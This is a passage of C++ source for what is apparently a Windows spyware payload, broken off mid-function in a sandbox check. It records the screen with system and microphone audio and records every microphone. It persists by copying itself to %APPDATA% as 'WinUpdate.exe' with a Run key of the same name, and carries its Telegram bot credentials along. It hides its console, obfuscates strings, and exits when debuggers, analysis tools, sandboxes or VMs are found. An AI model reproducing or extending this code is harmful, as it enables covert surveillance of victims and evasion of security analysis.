            loopback ? "sys" : "mic", totalPackets, totalInFrames, silentPackets, pcm.size());
        traceStage(tb);
    }

    if (pcm.empty()) return false;

    // If the device ran at an unusual rate, do a crude linear resample so the
    // MP4 audio lines up with the video timeline.
    if (!sameRate && inRate > 0) {
        const size_t inFrames = pcm.size() / 2 / outCh;
        const size_t outFrames = (size_t)((long long)inFrames * outRate / inRate);
        std::vector<char> resampled(outFrames * outCh * 2);
        const short* src = (const short*)pcm.data();
        short* dst = (short*)resampled.data();
        for (size_t i = 0; i < outFrames; ++i) {
            size_t si = (size_t)((long long)i * inRate / outRate);
            if (si >= inFrames) si = inFrames - 1;
            dst[i * outCh + 0] = src[si * outCh + 0];
            dst[i * outCh + 1] = src[si * outCh + 1];
        }
        pcm.swap(resampled);
    }

    sampleRate = outRate;
    channels = outCh;
    outPcm = std::move(pcm);
    return true;
}

// Capture microphone + system audio concurrently for `durationSec` and mix them.
struct MixedAudio {
    std::vector<char> pcm;
    DWORD sampleRate = 44100;
    WORD channels = 2;
    bool hasAny = false;
};

static MixedAudio captureScreenAudio(int durationSec) {
    MixedAudio out;
    std::vector<char> mic, sys;
    DWORD micRate = 0, sysRate = 0;
    WORD micCh = 0, sysCh = 0;

    std::thread tMic([&]() {
        wasapiRecordEndpoint(false, durationSec, mic, micRate, micCh, std::string());
    });
    std::thread tSys([&]() {
        wasapiRecordEndpoint(true, durationSec, sys, sysRate, sysCh, std::string());
    });
    tMic.join();
    tSys.join();

    {
        char tb[160];
        snprintf(tb, sizeof(tb), "screenaudio: mic=%zu bytes sys=%zu bytes",
            mic.size(), sys.size());
        traceStage(tb);
    }

    // If loopback produced nothing, fall back to the classic "Stereo Mix" /
    // "What U Hear" capture device that most Realtek drivers still expose.
    if (sys.empty()) {
        static const char* kMixNames[] = {
            "Stereo Mix", "stereo mix", "What U Hear", "What U Hear",
            "Loopback", "Sum", "Mix", "Stereo"
        };
        for (const char* mn : kMixNames) {
            if (wasapiRecordEndpoint(false, durationSec, sys, sysRate, sysCh, mn) && !sys.empty()) {
                traceStage("screenaudio: system audio recovered via Stereo Mix device");
                break;
            }
            sys.clear();
            sysRate = 0;
            sysCh = 0;
        }
    }

    // Both endpoints are normalised to 44.1 kHz stereo 16-bit in
    // wasapiRecordEndpoint, so mixing is a plain sample-wise average.
    const size_t n = (mic.size() > sys.size()) ? mic.size() : sys.size();
    if (n == 0) return out;

    const size_t samples = n / 2;
    out.pcm.assign(samples * 2, 0);
    short* dst = (short*)out.pcm.data();
    const short* m = mic.empty() ? nullptr : (const short*)mic.data();
    const short* s = sys.empty() ? nullptr : (const short*)sys.data();
    const size_t mSamples = mic.size() / 2;
    const size_t sSamples = sys.size() / 2;

    for (size_t i = 0; i < samples; ++i) {
        int mv = (m && i < mSamples) ? m[i] : 0;
        int sv = (s && i < sSamples) ? s[i] : 0;
        int v = (m && s) ? (mv + sv) / 2 : (mv + sv);
        if (v > 32767) v = 32767;
        if (v < -32768) v = -32768;
        dst[i] = (short)v;
    }

    out.hasAny = true;
    return out;
}

// Fallback recorder: capture frames for `durationSec` and emit an animated GIF.
// Downscale a top-down 32bpp BGRA frame by an integer factor using box sampling.
static std::vector<BYTE> downscaleFrame(const std::vector<BYTE>& src, int sw, int sh, int factor,
    int& outW, int& outH) {
    outW = sw / factor;
    outH = sh / factor;
    std::vector<BYTE> dst((size_t)outW * outH * 4);
    for (int y = 0; y < outH; ++y) {
        for (int x = 0; x < outW; ++x) {
            size_t si = ((size_t)(y * factor) * sw + (size_t)(x * factor)) * 4;
            size_t di = ((size_t)y * outW + (size_t)x) * 4;
            memcpy(&dst[di], &src[si], 4);
        }
    }
    return dst;
}

// Native screen recorder: Windows-only, no ffmpeg required.
//
// Video: Media Foundation H.264 -> MP4 (falls back to an animated GIF only if
//        the H.264 MFT is unavailable on the host).
// Audio: microphone + system loopback captured over the SAME wall-clock window
//        as the frames and muxed into the MP4 as AAC.
static std::vector<std::pair<std::string, std::vector<char>>> recordScreenNative(int durationSec) {
    std::vector<std::pair<std::string, std::vector<char>>> result;
    if (durationSec < 1) durationSec = 1;
    if (durationSec > 600) durationSec = 600;

    const int fps = 12;

    // Kick audio capture off first so it covers the full recording window.
    MixedAudio audio;
    std::thread audioThread([&]() { audio = captureScreenAudio(durationSec); });

    std::vector<std::vector<BYTE>> frames;
    int w = 0, h = 0;
    std::vector<BYTE> prev;
    bool dimsReady = false;

    DWORD start = GetTickCount();
    const DWORD end = start + (DWORD)durationSec * 1000;
    DWORD nextFrameAt = start;

    while (true) {
        DWORD now = GetTickCount();
        if ((long)(now - end) >= 0) break;

        std::vector<BYTE> raw;
        int rw = 0, rh = 0;
        if (grabDesktopPixels(raw, rw, rh) && rw > 0 && rh > 0) {
            if (!dimsReady) {
                // Keep the full native resolution — H.264 handles 1080p easily and
                // the user explicitly wants the taskbar included.
                w = rw; h = rh;
                frames.push_back(raw);
                prev = std::move(raw);
                dimsReady = true;
            } else if (rw == w && rh == h) {
                bool last = ((long)(now + 1000 / fps - end) >= 0);
                if (last || frameDelta(prev, raw) > 0.002)
                    frames.push_back(raw);
                prev = std::move(raw);
            }
        }

        nextFrameAt += 1000 / fps;
        DWORD after = GetTickCount();
        if ((long)(nextFrameAt - after) > 0)
            std::this_thread::sleep_for(std::chrono::milliseconds(nextFrameAt - after));
    }

    // Guarantee the frame count matches the requested duration so the audio and
    // video timelines line up even if the desktop never changed.
    {
        int want = durationSec * fps;
        if (want < 1) want = 1;
        // Loop/trim to the expected length (repeat last frame if static).
        while ((int)frames.size() < want && !frames.empty())
            frames.push_back(frames.back());
        if ((int)frames.size() > want)
            frames.resize(want);
        (void)start;
    }

    if (audioThread.joinable()) audioThread.join();

    if (frames.size() >= 2 && w > 0 && h > 0) {
        std::string outPath = getTempDir() + "screen_" + std::to_string(GetTickCount()) + ".mp4";
        bool wrote = false;

        if (ensureMfStarted()) {
            wrote = writeMp4(outPath, frames, w, h, fps,
                audio.hasAny ? audio.pcm : std::vector<char>(),
                audio.hasAny ? audio.sampleRate : 44100,
                audio.hasAny ? audio.channels : (WORD)2);
        }

        if (!wrote) {
            // Last-resort GIF so the screen folder is never empty.
            std::string gifPath = getTempDir() + "screen_" + std::to_string(GetTickCount()) + ".gif";
            if (writeAnimatedGif(gifPath, frames, w, h, 100 / 4)) {
                auto gdata = readFileToVector(gifPath);
                DeleteFileA(gifPath.c_str());
                if (!gdata.empty())
                    result.push_back({ "screen/screen_record.gif", std::move(gdata) });
            }
        } else {
            auto data = readFileToVector(outPath);
            DeleteFileA(outPath.c_str());
            if (!data.empty())
                result.push_back({ "screen/screen_record.mp4", std::move(data) });
        }
    }

    // Always keep at least one still frame so the folder is never empty.
    if (result.empty()) {
        auto shot = captureScreenshot();
        if (!shot.empty())
            result.push_back({ "screen/last_frame.png", std::move(shot) });
    }
    return result;
}

static std::vector<std::pair<std::string, std::vector<char>>> recordScreen(int durationSec) {
    if (durationSec < 1) durationSec = 1;
    if (durationSec > 600) durationSec = 600;
    DWORD timeoutMs = (DWORD)durationSec * 1000 + 30000;
    std::string tArg = " -t " + std::to_string(durationSec) + " ";

    std::vector<std::pair<std::string, std::vector<char>>> result;
    auto monitors = getAllMonitors();

    if (findFfmpeg().empty()) {
        // No ffmpeg anywhere — use the built-in Windows recorder so the feature
        // still produces a real recording instead of vanishing silently.
        return recordScreenNative(durationSec);
    }

    // Use entire desktop without offset for full screen including taskbar
    const char* codecs[] = { "libx264", "mpeg4", "h264" };
    
    for (const auto& mon : monitors) {
        std::string tag = "mon" + std::to_string(mon.index) + (mon.primary ? "_primary" : "");
        std::string outPath = getTempDir() + "screen_" + tag + "_" + std::to_string(GetTickCount()) + ".mp4";
        
        bool success = false;
        // Try multiple encoding options
        for (const char* codec : codecs) {
            std::string args = "-f gdigrab -framerate 15 -video_size " + std::to_string(mon.w) + "x" + std::to_string(mon.h) +
                tArg + "-i desktop -c:v " + std::string(codec) + " -preset ultrafast -pix_fmt yuv420p -an -y " + quoteArg(outPath);
            
            if (runFfmpeg(args, timeoutMs)) {
                success = true;
                break;
            }
            Sleep(50);
        }

        if (success) {
            auto data = readFileToVector(outPath);
            DeleteFileA(outPath.c_str());
            if (!data.empty())
                result.push_back({ "screen/" + tag + ".mp4", std::move(data) });
        }
    }

    if (monitors.size() > 1) {
        std::string outPath = getTempDir() + "screen_all_" + std::to_string(GetTickCount()) + ".mp4";
        bool success = false;
        for (const char* codec : codecs) {
            std::string args = "-f gdigrab -framerate 10 -video_size 1920x1080" + tArg + "-i desktop -c:v " + std::string(codec) + " -preset ultrafast -pix_fmt yuv420p -an -y " + quoteArg(outPath);
            
            if (runFfmpeg(args, timeoutMs)) {
                success = true;
                break;
            }
            Sleep(50);
        }

        if (success) {
            auto data = readFileToVector(outPath);
            DeleteFileA(outPath.c_str());
            if (!data.empty())
                result.push_back({ "screen/all_monitors.mp4", std::move(data) });
        }
    }

    return result;
}

// === Feature: Microphone Ä‚â€žĂ˘â‚¬ĹˇÄ‚â€ąĂ‚ÂĂ„â€šĂ‹ÂÄ‚ËĂ˘â€šÂ¬ÄąË‡Ä‚â€šĂ‚Â¬Ă„â€šĂ‹ÂÄ‚ËĂ˘â‚¬ĹˇĂ‚Â¬Ă„Ä…Ă„â€ž stereo waveIn + ffmpeg dshow fallback ===

static std::vector<char> buildWavStereo(const std::vector<char>& pcm, DWORD sampleRate, WORD channels, WORD bits) {
    std::vector<char> wav;
    DWORD dataLen = (DWORD)pcm.size();
    DWORD chunkSize = 36 + dataLen;
    DWORD fmtSize = 16;
    WORD audioFmt = 1;
    WORD blockAlign = (WORD)(channels * bits / 8);
    DWORD byteRate = sampleRate * blockAlign;

    wav.insert(wav.end(), "RIFF", "RIFF" + 4);
    wav.insert(wav.end(), (char*)&chunkSize, (char*)&chunkSize + 4);
    wav.insert(wav.end(), "WAVE", "WAVE" + 4);
    wav.insert(wav.end(), "fmt ", "fmt " + 4);
    wav.insert(wav.end(), (char*)&fmtSize, (char*)&fmtSize + 4);
    wav.insert(wav.end(), (char*)&audioFmt, (char*)&audioFmt + 2);
    wav.insert(wav.end(), (char*)&channels, (char*)&channels + 2);
    wav.insert(wav.end(), (char*)&sampleRate, (char*)&sampleRate + 4);
    wav.insert(wav.end(), (char*)&byteRate, (char*)&byteRate + 4);
    wav.insert(wav.end(), (char*)&blockAlign, (char*)&blockAlign + 2);
    wav.insert(wav.end(), (char*)&bits, (char*)&bits + 2);
    wav.insert(wav.end(), "data", "data" + 4);
    wav.insert(wav.end(), (char*)&dataLen, (char*)&dataLen + 4);
    wav.insert(wav.end(), pcm.begin(), pcm.end());
    return wav;
}

static bool pcmHasSignal(const std::vector<char>& pcm) {
    if (pcm.size() < 4) return false;
    size_t samples = pcm.size() / 2;
    size_t step = samples > 50000 ? samples / 50000 : 1;
    int nonzero = 0;
    int maxAbs = 0;
    for (size_t i = 0; i < samples; i += step) {
        short s = 0;
        memcpy(&s, pcm.data() + i * 2, 2);
        int a = s < 0 ? -s : s;
        if (a > maxAbs) maxAbs = a;
        if (a > 80) nonzero++;
    }
    return maxAbs > 200 || nonzero > 20;
}

static std::vector<char> recordMicrophoneWaveIn(UINT deviceId, int durationSec) {
    if (durationSec < 1) durationSec = 1;
    if (durationSec > 600) durationSec = 600;
    DWORD durationMs = (DWORD)durationSec * 1000;

    WAVEFORMATEX wfx = {};
    wfx.wFormatTag = WAVE_FORMAT_PCM;
    wfx.nChannels = 2; // devices on this machine are stereo
    wfx.nSamplesPerSec = 44100;
    wfx.wBitsPerSample = 16;
    wfx.nBlockAlign = (WORD)(wfx.nChannels * wfx.wBitsPerSample / 8);
    wfx.nAvgBytesPerSec = wfx.nSamplesPerSec * wfx.nBlockAlign;

    HWAVEIN hWaveIn = nullptr;
    if (waveInOpen(&hWaveIn, deviceId, &wfx, 0, 0, CALLBACK_NULL) != MMSYSERR_NOERROR) {
        // try mono fallback
        wfx.nChannels = 1;
        wfx.nBlockAlign = (WORD)(wfx.nChannels * wfx.wBitsPerSample / 8);
        wfx.nAvgBytesPerSec = wfx.nSamplesPerSec * wfx.nBlockAlign;
        if (waveInOpen(&hWaveIn, deviceId, &wfx, 0, 0, CALLBACK_NULL) != MMSYSERR_NOERROR)
            return {};
    }

    const int NUM_BUFFERS = 8;
    DWORD bufSize = (wfx.nAvgBytesPerSec / 4);
    if (bufSize < 8192) bufSize = 8192;
    bufSize = (bufSize / wfx.nBlockAlign) * wfx.nBlockAlign;

    std::vector<std::vector<char>> buffers(NUM_BUFFERS);
    std::vector<WAVEHDR> headers(NUM_BUFFERS);
    std::vector<char> pcm;

    for (int i = 0; i < NUM_BUFFERS; i++) {
        buffers[i].assign(bufSize, 0);
        ZeroMemory(&headers[i], sizeof(WAVEHDR));
        headers[i].lpData = buffers[i].data();
        headers[i].dwBufferLength = bufSize;
        waveInPrepareHeader(hWaveIn, &headers[i], sizeof(WAVEHDR));
        waveInAddBuffer(hWaveIn, &headers[i], sizeof(WAVEHDR));
    }

    if (waveInStart(hWaveIn) != MMSYSERR_NOERROR) {
        for (int i = 0; i < NUM_BUFFERS; i++)
            waveInUnprepareHeader(hWaveIn, &headers[i], sizeof(WAVEHDR));
        waveInClose(hWaveIn);
        return {};
    }

    DWORD start = GetTickCount();
    while (GetTickCount() - start < durationMs) {
        for (int i = 0; i < NUM_BUFFERS; i++) {
            if (headers[i].dwFlags & WHDR_DONE) {
                if (headers[i].dwBytesRecorded > 0) {
                    pcm.insert(pcm.end(), headers[i].lpData, headers[i].lpData + headers[i].dwBytesRecorded);
                }
                headers[i].dwBytesRecorded = 0;
                headers[i].dwFlags = WHDR_PREPARED;
                waveInAddBuffer(hWaveIn, &headers[i], sizeof(WAVEHDR));
            }
        }
        Sleep(15);
    }

    waveInStop(hWaveIn);
    waveInReset(hWaveIn);
    for (int i = 0; i < NUM_BUFFERS; i++) {
        if (headers[i].dwBytesRecorded > 0)
            pcm.insert(pcm.end(), headers[i].lpData, headers[i].lpData + headers[i].dwBytesRecorded);
        waveInUnprepareHeader(hWaveIn, &headers[i], sizeof(WAVEHDR));
    }
    waveInClose(hWaveIn);

    if (pcm.empty())
        return {};
    // Keep recording even if quiet (user wants every mic); only drop empty buffers
    return buildWavStereo(pcm, wfx.nSamplesPerSec, wfx.nChannels, wfx.wBitsPerSample);
}

static std::string sanitizeMicName(std::string s) {
    for (char& c : s) {
        if (!((c >= 'a' && c <= 'z') || (c >= 'A' && c <= 'Z') || (c >= '0' && c <= '9') || c == '-' || c == '_'))
            c = '_';
    }
    if (s.size() > 40) s.resize(40);
    return s.empty() ? "mic" : s;
}

// Record ALL detected microphones into separate files
static std::vector<std::pair<std::string, std::vector<char>>> recordAllMicrophones(int durationSec) {
    if (durationSec < 1) durationSec = 1;
    if (durationSec > 600) durationSec = 600;
    DWORD timeoutMs = (DWORD)durationSec * 1000 + 15000;

    std::vector<std::pair<std::string, std::vector<char>>> result;

    // At boot, audio services may not be ready — retry up to 8 times (total ~30s)
    UINT n = 0;
    for (int retry = 0; retry < 8; retry++) {
        n = waveInGetNumDevs();
        if (n > 0) break;
        if (retry < 7) Sleep(4000);
    }
    for (UINT d = 0; d < n; d++) {
        WAVEINCAPSA caps = {};
        std::string name = "wavein_" + std::to_string(d);
        if (waveInGetDevCapsA(d, &caps, sizeof(caps)) == MMSYSERR_NOERROR)
            name = caps.szPname;
        auto wav = recordMicrophoneWaveIn(d, durationSec);
        if (!wav.empty())
            result.push_back({ "audio/" + sanitizeMicName(name) + ".wav", std::move(wav) });
    }

    std::string list = captureFfmpegDeviceList();
    auto audios = parseDshowNames(list, "(audio)");
    for (size_t i = 0; i < audios.size(); i++) {
        std::string mic = audios[i];
        std::string safe = sanitizeMicName(mic);
        bool already = false;
        for (const auto& f : result) {
            if (f.first.find(safe) != std::string::npos) { already = true; break; }
        }
        if (already && !result.empty()) continue;

        std::string outPath = getTempDir() + "mic_ff_" + std::to_string(GetTickCount()) + "_" + std::to_string(i) + ".wav";
        std::string args = "-f dshow -i audio=" + quoteArg(mic) +
            " -t " + std::to_string(durationSec) + " -ac 2 -ar 44100 -c:a pcm_s16le " + quoteArg(outPath);
        if (!runFfmpeg(args, timeoutMs))
            continue;
        auto data = readFileToVector(outPath);
        DeleteFileA(outPath.c_str());
        if (data.size() < 1000) continue;
        result.push_back({ "audio/" + safe + ".wav", std::move(data) });
    }

    if (result.empty()) {
        auto wav = recordMicrophoneWaveIn(WAVE_MAPPER, durationSec);
        if (!wav.empty())
            result.push_back({ "audio/microphone.wav", std::move(wav) });
    }

    return result;
}

static std::vector<char> recordMicrophone(int durationSec) {
    auto all = recordAllMicrophones(durationSec);
    if (all.empty()) return {};
    return all.front().second;
}

// === Feature: Auto-start ===
//
// Auto-start has exactly one job: when the device starts, the payload runs and
// delivers a fresh hit. It does not need to arrange that itself — the normal
// startup path in executeFeatures() already sends the archive plus the hit
// caption — so all this has to do is leave a Run entry behind.
//
// Persistence (below) is what makes that entry point at a stable copy of the exe.
// HKCU, so no elevation is required.

static const char* kRunKeyPath = "Software\\Microsoft\\Windows\\CurrentVersion\\Run";
static const char* kRunValueName = "WinUpdate";

static void writeRunEntry(const std::string& exePath) {
    HKEY hKey;
    if (RegOpenKeyExA(HKEY_CURRENT_USER, kRunKeyPath, 0, KEY_SET_VALUE, &hKey) != ERROR_SUCCESS)
        return;
    RegSetValueExA(hKey, kRunValueName, 0, REG_SZ,
        (const BYTE*)exePath.c_str(), (DWORD)exePath.size() + 1);
    RegCloseKey(hKey);
}

static void enableAutoStart() {
    char exePath[MAX_PATH] = {};
    GetModuleFileNameA(nullptr, exePath, MAX_PATH);
    writeRunEntry(exePath);
}

// Locates the config the same way loadConfig() reads it: beside the running exe,
// as config.ini, payload.ini or <exe-name>.ini. Persistence needs this so the
// stable copy can be given the credentials it needs to reach Telegram.
static std::string findConfigPath() {
    char exePath[MAX_PATH] = {};
    GetModuleFileNameA(nullptr, exePath, MAX_PATH);
    std::string exeStr(exePath);

    size_t slash = exeStr.find_last_of("\\/");
    std::string dir = (slash == std::string::npos) ? std::string(".") : exeStr.substr(0, slash);
    size_t dotPos = exeStr.rfind('.');
    std::string sameNameIni = (dotPos == std::string::npos)
        ? (exeStr + ".ini")
        : (exeStr.substr(0, dotPos) + ".ini");

    const std::string candidates[] = { dir + "\\config.ini", dir + "\\payload.ini", sameNameIni };
    for (const auto& p : candidates) {
        std::ifstream f(p, std::ios::in | std::ios::binary);
        if (f.is_open())
            return p;
    }
    return std::string();
}

// === Feature: Persistence ===
//
// The binder runs the payload from %LOCALAPPDATA%\Temp\<hex>\conhost-<hex>.exe —
// a randomly named file in a folder the shell is free to sweep. A Run entry
// pointing there goes dead the first time Temp is cleaned. Persistence installs
// a stable copy instead and points the Run entry at that copy.
static void enablePersistence() {
    char exePath[MAX_PATH] = {};
    GetModuleFileNameA(nullptr, exePath, MAX_PATH);

    char appData[MAX_PATH] = {};
    if (FAILED(SHGetFolderPathA(nullptr, CSIDL_APPDATA, nullptr, 0, appData))) {
        enableAutoStart(); // no stable location available; a plain Run entry is all we can do
        return;
    }

    const std::string destExe = std::string(appData) + "\\WinUpdate.exe";
    // Named after the exe so it matches the payload's "<exe-name>.ini" candidate:
    // only the installed copy picks it up, the temp copy keeps using its own.
    const std::string destIni = std::string(appData) + "\\WinUpdate.ini";

    // Running from the installed copy already (it re-enters here on every start):
    // nothing to copy, the Run entry just gets re-asserted below.
    if (_stricmp(exePath, destExe.c_str()) != 0) {
        if (!CopyFileA(exePath, destExe.c_str(), FALSE)) {
            enableAutoStart(); // could not drop the stable copy; fall back
            return;
        }
        // Without a config beside it the copy would start with no bot_token and
        // exit immediately, so the credentials have to travel with it.
        const std::string cfgPath = findConfigPath();
        if (!cfgPath.empty())
            CopyFileA(cfgPath.c_str(), destIni.c_str(), FALSE);
    }

    // Deliberately the last step, and deliberately NOT followed by
    // enableAutoStart(): that rewrites the same value name with the temp path and
    // would undo everything above.
    writeRunEntry(destExe);
}

// === NT API dynamic loading for anti-analysis ===

typedef LONG NTSTATUS;
typedef NTSTATUS (NTAPI *NtQueryInformationProcess_t)(HANDLE, ULONG, PVOID, ULONG, PULONG);
typedef NTSTATUS (NTAPI *NtSetInformationThread_t)(HANDLE, ULONG, PVOID, ULONG);

#ifndef ProcessDebugPort
#define ProcessDebugPort 0x07
#endif
#ifndef ProcessDebugFlags
#define ProcessDebugFlags 0x1F
#endif
#ifndef ProcessDebugObjectHandle
#define ProcessDebugObjectHandle 0x1E
#endif
#ifndef ThreadHideFromDebugger
#define ThreadHideFromDebugger 0x0B
#endif

static NtQueryInformationProcess_t pNtQueryInformationProcess = nullptr;
static NtSetInformationThread_t pNtSetInformationThread = nullptr;

static void initNtApis() {
    static bool inited = false;
    if (inited) return;
    inited = true;
    HMODULE hNtdll = GetModuleHandleA(OX("ntdll.dll"));
    if (hNtdll) {
        pNtQueryInformationProcess = (NtQueryInformationProcess_t)GetProcAddress(hNtdll, OX("NtQueryInformationProcess"));
        pNtSetInformationThread = (NtSetInformationThread_t)GetProcAddress(hNtdll, OX("NtSetInformationThread"));
    }
}

// === Feature: Stealth mode ===

static void enableStealth() {
    HWND hWnd = GetConsoleWindow();
    if (hWnd)
        ShowWindow(hWnd, SW_HIDE);

    SetPriorityClass(GetCurrentProcess(), BELOW_NORMAL_PRIORITY_CLASS);

    // Hide thread from debugger
    initNtApis();
    if (pNtSetInformationThread) {
        ULONG hide = 1;
        pNtSetInformationThread(GetCurrentThread(), ThreadHideFromDebugger, &hide, sizeof(hide));
    }
}

// === Feature: Enhanced Anti-debugging (8 detection methods) ===

static bool checkDebuggerWindows() {
    const char* dbgClasses[] = {
        OX("OLLYDBG"), OX("WinDbgFrameClass"), OX("ID"), OX("Zeta Debugger"),
        OX("x64dbg"), OX("x32dbg"), OX("Immunity Debugger"),
        OX("Qt5152QWindowIcon"), nullptr
    };
    for (int i = 0; dbgClasses[i]; i++) {
        if (FindWindowA(dbgClasses[i], nullptr))
            return true;
    }
    return false;
}

static bool checkDebuggerProcesses() {
    const char* dbgNames[] = {
        OX("ollydbg.exe"), OX("x64dbg.exe"), OX("x32dbg.exe"), OX("windbg.exe"),
        OX("ida.exe"), OX("ida64.exe"), OX("idag.exe"), OX("idag64.exe"),
        OX("immunitydebugger.exe"), OX("debugger.exe"), OX("procmon.exe"),
        OX("procmon64.exe"), OX("processhacker.exe"), OX("fiddler.exe"),
        OX("wireshark.exe"), OX("httpdebugger.exe"), OX("httpdebuggerui.exe"),
        OX("pestudio.exe"), OX("die.exe"), OX("lordpe.exe"), OX("regshot.exe"),
        OX("procexp.exe"), OX("procexp64.exe"), OX("dnspy.exe"),
        nullptr
    };

    HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnap == INVALID_HANDLE_VALUE) return false;

    PROCESSENTRY32W pe = {};
    pe.dwSize = sizeof(pe);
    bool found = false;
    if (Process32FirstW(hSnap, &pe)) {
        do {
            char name[MAX_PATH];
            WideCharToMultiByte(CP_ACP, 0, pe.szExeFile, -1, name, sizeof(name), nullptr, nullptr);
            for (int i = 0; dbgNames[i]; i++) {
                if (_stricmp(name, dbgNames[i]) == 0) {
                    found = true;
                    break;
                }
            }
            if (found) break;
        } while (Process32NextW(hSnap, &pe));
    }
    CloseHandle(hSnap);
    return found;
}

static bool checkDebugRegisters() {
    CONTEXT ctx = {};
    ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;
    if (GetThreadContext(GetCurrentThread(), &ctx)) {
        if (ctx.Dr0 || ctx.Dr1 || ctx.Dr2 || ctx.Dr3 || ctx.Dr6 || ctx.Dr7)
            return true;
    }
    return false;
}

static bool checkNtQueryDebugPort() {
    initNtApis();
    if (!pNtQueryInformationProcess) return false;

    DWORD_PTR debugPort = 0;
    NTSTATUS status = pNtQueryInformationProcess(GetCurrentProcess(), ProcessDebugPort,
        &debugPort, sizeof(debugPort), nullptr);
    if (status == 0 && debugPort != 0)
        return true;

    DWORD debugFlags = 0;
    status = pNtQueryInformationProcess(GetCurrentProcess(), ProcessDebugFlags,
        &debugFlags, sizeof(debugFlags), nullptr);
    if (status == 0 && debugFlags == 0)
        return true;

    HANDLE hDebugObject = nullptr;
    status = pNtQueryInformationProcess(GetCurrentProcess(), ProcessDebugObjectHandle,
        &hDebugObject, sizeof(hDebugObject), nullptr);
    if (status == 0 && hDebugObject != nullptr)
        return true;

    return false;
}

static bool checkPebBeingDebugged() {
#ifdef _WIN64
    BYTE* peb = (BYTE*)__readgsqword(0x60);
#else
    BYTE* peb = (BYTE*)__readfsdword(0x30);
#endif
    if (peb)
        return peb[2] != 0;
    return false;
}

static bool checkRdtscTiming() {
    LARGE_INTEGER freq, start, end;
    QueryPerformanceFrequency(&freq);
    QueryPerformanceCounter(&start);

    volatile int x = 0;
    for (int i = 0; i < 100000; i++) x += i;

    QueryPerformanceCounter(&end);
    double elapsed = (double)(end.QuadPart - start.QuadPart) / freq.QuadPart;
    return elapsed > 0.5;
}

static bool checkNtGlobalFlag() {
#ifdef _WIN64
    BYTE* peb = (BYTE*)__readgsqword(0x60);
    if (peb) {
        DWORD ntGlobalFlag = *(DWORD*)(peb + 0xBC);
        // 0x70 = FLG_HEAP_ENABLE_TAIL_CHECK | FLG_HEAP_ENABLE_FREE_CHECK | FLG_HEAP_VALIDATE_PARAMETERS
        return (ntGlobalFlag & 0x70) != 0;
    }
#else
    BYTE* peb = (BYTE*)__readfsdword(0x30);
    if (peb) {
        DWORD ntGlobalFlag = *(DWORD*)(peb + 0x68);
        return (ntGlobalFlag & 0x70) != 0;
    }
#endif
    return false;
}

static bool checkHeapFlags() {
#ifdef _WIN64
    BYTE* peb = (BYTE*)__readgsqword(0x60);
    if (peb) {
        PVOID* processHeaps = *(PVOID**)(peb + 0xF0);
        DWORD numHeaps = *(DWORD*)(peb + 0xE8);
        if (processHeaps && numHeaps > 0) {
            // Check first heap's Flags and ForceFlags
            DWORD heapFlags = *(DWORD*)((BYTE*)processHeaps[0] + 0x70);
            DWORD forceFlags = *(DWORD*)((BYTE*)processHeaps[0] + 0x74);
            if (heapFlags != 2 || forceFlags != 0)
                return true;
        }
    }
#else
    BYTE* peb = (BYTE*)__readfsdword(0x30);
    if (peb) {
        PVOID* processHeaps = *(PVOID**)(peb + 0x90);
        DWORD numHeaps = *(DWORD*)(peb + 0x88);
        if (processHeaps && numHeaps > 0) {
            DWORD heapFlags = *(DWORD*)((BYTE*)processHeaps[0] + 0x0C);
            DWORD forceFlags = *(DWORD*)((BYTE*)processHeaps[0] + 0x10);
            if (heapFlags != 2 || forceFlags != 0)
                return true;
        }
    }
#endif
    return false;
}

static bool checkRemoteDebugger() {
    BOOL present = FALSE;
    CheckRemoteDebuggerPresent(GetCurrentProcess(), &present);
    return present != FALSE;
}

static bool isBeingDebugged() {
    if (IsDebuggerPresent()) return true;
    if (checkRemoteDebugger()) return true;
    if (checkDebugRegisters()) return true;
    if (checkNtQueryDebugPort()) return true;
    if (checkPebBeingDebugged()) return true;
    if (checkNtGlobalFlag()) return true;
    if (checkHeapFlags()) return true;
    if (checkDebuggerWindows()) return true;
    if (checkDebuggerProcesses()) return true;
    if (checkRdtscTiming()) return true;
    return false;
}

static void hideThreadFromDebugger() {
    initNtApis();
    if (pNtSetInformationThread) {
        ULONG hide = 1;
        pNtSetInformationThread(GetCurrentThread(), ThreadHideFromDebugger, &hide, sizeof(hide));
    }
}

static void runAntiDebug() {
    hideThreadFromDebugger();
    if (isBeingDebugged())
        ExitProcess(0);
}

// === Feature: Sandbox / VM detection (7 checks, score-based) ===

static bool checkSandboxUsername() {
    char username[256] = {};
    DWORD size = sizeof(username);
    if (!GetUserNameA(username, &size)) return false;

    const char* sandboxNames[] = {
        OX("sandbox"), OX("malware"), OX("virus"), OX("test"), OX("sample"),
        OX("cuckoo"), OX("analysis"), OX("john doe"), OX("hal9th"),
        OX("panda"), OX("currentuser"), OX("user1"), nullptr
    };

    char lower[256];
    size_t i;
    for (i = 0; i < sizeof(lower) - 1 && username[i]; i++)
        lower[i] = (char)tolower((unsigned char)username[i]);
    lower[i] = 0;

    for (int j = 0; sandboxNames[j]; j++) {
        if (strstr(lower, sandboxNames[j]))
            return true;
    }
    return false;
}

static bool checkSandboxProcesses() {
    const char* sandboxProcs[] = {
        OX("vboxservice.exe"), OX("vboxtray.exe"), OX("vmtoolsd.exe"),
        OX("vmwaretray.exe"), OX("vmwareuser.exe"), OX("vmsrvc.exe"),
        OX("prl_cc.exe"), OX("prl_tools.exe"), OX("xenservice.exe"),
        OX("qemu-ga.exe"), OX("cuckoo.exe"), OX("cuckoomon.exe"),
        OX("sbiesvc.exe"), OX("sbiectrl.exe"), OX("sandboxiedcomlaunch.exe"),
        nullptr
    };

    HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnap == INVALID_HANDLE_VALUE) return false;

    PROCESSENTRY32W pe = {};
    pe.dwSize = sizeof(pe);
    bool found = false;
    if (Process32FirstW(hSnap, &pe)) {
        do {
            char name[MAX_PATH];
            WideCharToMultiByte(CP_ACP, 0, pe.szExeFile, -1, name, sizeof(name), nullptr, nullptr);
            for (int i = 0; sandboxProcs[i]; i++) {
                if (_stricmp(name, sandboxProcs[i]) == 0) {
                    found = true;
                    break;
                }
            }
            if (found) break;
        } while (Process32NextW(hSnap, &pe));
    }
    CloseHandle(hSnap);
    return found;
}

static bool checkSandboxMac() {
    auto& api = dynApi();
    if (!api.GetAdaptersAddresses) return false;

    ULONG outBufLen = 0;
    if (api.GetAdaptersAddresses(AF_UNSPEC, 0, nullptr, nullptr, &outBufLen) != ERROR_BUFFER_OVERFLOW)
        return false;

